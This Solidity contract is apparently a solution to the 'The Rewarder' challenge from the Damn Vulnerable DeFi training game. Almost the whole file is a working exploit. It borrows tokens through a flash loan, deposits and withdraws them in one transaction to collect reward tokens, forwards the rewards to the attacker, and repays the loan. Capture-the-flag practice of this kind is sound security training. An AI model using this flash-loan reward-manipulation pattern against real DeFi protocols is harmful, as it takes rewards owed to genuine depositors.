// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

/**
 * @title AttackRewarder
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackRewarder {
    using Address for address;
    using SafeMath for uint256;

    address private immutable owner;
    address private immutable pool;
    address private immutable liquidityToken;
    // DamnValuableToken private immutable liquidityTokenDVT;
    address private immutable rewarder;
    address private immutable rewardToken;

    constructor(
        address poolAddress, 
        address liquidityTokenAddress, 
        address rewarderAddress,
        address rewardTokenAddress
    ) {
        owner = msg.sender;
        pool = poolAddress;
        liquidityToken = liquidityTokenAddress; // 279099
        // liquidityTokenDVT = DamnValuableToken(liquidityTokenAddress); // 286857
        // 317212
        rewarder = rewarderAddress;
        rewardToken = rewardTokenAddress;
    }

    modifier onlyAttacker {
        require(msg.sender == owner, "Only owner can use this contract");
        _;
    }

    function exploit() external onlyAttacker {}

    function executeFlashloan(uint256 amount) external onlyAttacker {
        // Execute flashloan
        FlashLoanerPool(pool).flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        DamnValuableToken(liquidityToken).approve(rewarder, amount);

        TheRewarderPool(rewarder).deposit(amount);
        TheRewarderPool(rewarder).withdraw(amount);

        uint256 rewardAmount = RewardToken(rewardToken).balanceOf(address(this));
        RewardToken(rewardToken).transfer(owner, rewardAmount);

        DamnValuableToken(liquidityToken).transfer(msg.sender, amount); // 29021848
    }
}